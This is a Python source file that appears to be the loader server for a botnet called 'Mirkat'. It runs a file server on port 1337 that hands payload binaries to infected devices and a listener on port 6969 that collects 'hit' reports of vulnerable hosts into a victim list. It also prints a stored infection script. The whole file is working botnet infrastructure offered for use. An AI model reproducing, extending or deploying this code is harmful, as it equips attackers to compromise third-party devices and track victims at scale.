import http.server, socketserver, threading, functools, socket

__FileServerPort__ = 1337
__ListennerPort__  = 6969

class MirkatConnection(threading.Thread):
    def __init__(self, session: socket.socket, ip: str, port: int):
        threading.Thread.__init__(self)
        self.session = session
        self.port = port
        self.ip = ip
    
    def run(self):
        print(f'[+] Connection etablished with {self.ip}:{self.port}')

        while True:
            try:
                data = self.session.recv(1024).decode('utf-8').strip().split('\n')[0]

                if '|' in data:
                    args= data.split('|')

                    if args[0] == 'hit':
                        print(f'[%] Hit from {self.ip} --> {args[1]}')
                        
                        with open('./db/vuln.txt', 'a+') as vf:
                            vf.write(f'{args[1]}\n')
            except:
                pass

class Loader():
    def __init__(self):
        self.run()

    def http_server(self):
        with socketserver.TCPServer(('0.0.0.0', __FileServerPort__), functools.partial(http.server.SimpleHTTPRequestHandler, directory= './Bin/')) as httpd:
            print(f'[*] File server open on port {__FileServerPort__}.')
            httpd.serve_forever()
    
    def run(self):
        threading.Thread(target= self.http_server).start()

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', __ListennerPort__))

        print(f'[*] Loader listenning on port {__ListennerPort__}')

        while True:
            sock.listen(1000)
            (socket_session, (ip, port)) = sock.accept()
            MirkatConnection(socket_session, ip, port).start()

if __name__ == '__main__':
    with open('./Bin/infect.sh', 'r+') as pf:
        print(f'[*] Payload "{pf.read()}"')
    Loader().run()